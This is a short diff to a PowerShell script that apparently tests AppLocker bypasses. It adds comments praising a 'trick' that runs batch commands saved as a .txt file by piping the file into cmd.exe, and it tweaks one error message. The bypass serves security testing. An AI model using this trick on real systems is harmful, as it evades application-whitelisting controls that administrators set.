@@ -221,6 +221,7 @@ If($TestBat -ieq "TestBypass"){
       Move-Item -Path "$Env:TMP\applock.bat" -Destination "$Env:TMP\applock.txt" -EA SilentlyContinue -Force
 
       Write-Host "[i] trying to execute applock.txt text file`n"
+      ## Nice trick to be abble to execute cmd stdin { < } on PS
       Start-Sleep -Seconds 1;cmd.exe /c "cmd.exe < %tmp%\applock.txt"
 
       Clear-Host
@@ -329,7 +330,7 @@ If($TestBat -Match '\\'){
    If(Test-Path -Path "$TestBat" -EA SilentlyContinue){
       Write-Host "[+] found: $TestBat";Start-Sleep -Seconds 1
    }Else{## User Input File NOT found!
-      Write-Host "`n`n[error] not found: $TestBat`n`n" -ForegroundColor Red -BackgroundColor Black
+      Write-Host "[error] not found: $TestBat`n`n" -ForegroundColor Red -BackgroundColor Black
       exit ## Exit @AppLocker
    }
 
@@ -339,6 +340,7 @@ If($TestBat -Match '\\'){
    cd $StripPath
    Write-Host "[i] trying to execute $Bypassext text file"
    Start-Sleep -Seconds 1;Write-Host "[+] script output:`n`n"
+   ## Nice trick to be abble to execute cmd stdin { < } on PS
    Start-Sleep -Seconds 1;cmd.exe /c "cmd.exe /K < $Bypassext"
 
    cd $Working_Directory
